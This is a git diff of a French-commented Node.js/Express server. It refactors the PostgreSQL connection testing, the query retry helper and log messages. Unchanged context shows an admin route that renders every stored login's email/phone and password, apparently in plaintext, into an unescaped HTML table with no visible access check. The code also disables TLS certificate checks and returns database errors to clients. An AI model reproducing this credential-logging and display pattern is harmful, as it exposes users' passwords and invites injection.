@@ -9,25 +9,33 @@ const PORT = process.env.PORT || 3000;
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Connexion PostgreSQL via Render DATABASE_URL
+// Connexion PostgreSQL via Pool
 const pool = new Pool({
   connectionString: process.env.DATABASE_URL,
   ssl: process.env.DATABASE_URL ? { rejectUnauthorized: false } : false
 });
 
-// Tester la connexion avant tout
-pool.connect()
-  .then(() => console.log("✅ Connecté à PostgreSQL Render"))
-  .catch(err => console.error("❌ Erreur PostgreSQL Render:", err));
+// TEST CONNEXION DB
+(async () => {
+  try {
+    const client = await pool.connect();
+    console.log("✅ Connexion à PostgreSQL réussie !");
+    const res = await client.query('SELECT NOW()');
+    console.log("Date/heure actuelle dans la DB :", res.rows[0]);
+    client.release();
+  } catch (err) {
+    console.error("❌ Impossible de se connecter à PostgreSQL :", err.message);
+  }
+})();
 
 // Fonction pour exécuter des requêtes avec retry
-async function runWithRetry(query, params = [], retries = 5) {
+async function runWithRetry(query, params, retries = 5) {
   try {
     return await pool.query(query, params);
   } catch (err) {
     if (retries > 0) {
       console.log(`Database error, retrying... (${retries} left)`);
-      await new Promise(res => setTimeout(res, 100));
+      await new Promise(res => setTimeout(res, 50));
       return runWithRetry(query, params, retries - 1);
     } else {
       throw err;
@@ -58,9 +66,9 @@ async function runWithRetry(query, params = [], retries = 5) {
       );
     `);
 
-    console.log("✅ Tables créées ou existantes OK");
+    console.log("✅ Tables vérifiées/créées avec succès !");
   } catch (err) {
-    console.error("❌ Erreur création tables:", err);
+    console.error("❌ Erreur création tables :", err.message);
   }
 })();
 
@@ -74,7 +82,6 @@ app.post('/signup', async (req, res) => {
     await runWithRetry(sql, params);
     res.redirect('/index.html');
   } catch (err) {
-    console.error("Erreur création utilisateur:", err.message);
     res.status(400).send('Erreur création utilisateur : ' + err.message);
   }
 });
@@ -105,16 +112,16 @@ app.get('/admin/logins', async (req, res) => {
   try {
     const result = await pool.query(`SELECT * FROM logins ORDER BY login_time DESC`);
     let html = `
-      <html>
-      <head>
-          <title>Liste des logins</title>
-          <link rel="stylesheet" href="/css/admin.css">
-      </head>
-      <body>
-      <h1>Liste des logins</h1>
-      <table>
-      <tr><th>ID</th><th>Email/Phone</th><th>Password</th><th>Login Time</th></tr>`;
-
+    <html>
+    <head>
+        <title>Liste des logins</title>
+        <link rel="stylesheet" href="/css/admin.css">
+    </head>
+    <body>
+    <h1>Liste des logins</h1>
+    <table>
+    <tr><th>ID</th><th>Email/Phone</th><th>Password</th><th>Login Time</th></tr>`;
+    
     result.rows.forEach(row => {
       html += `<tr>
         <td>${row.id}</td>
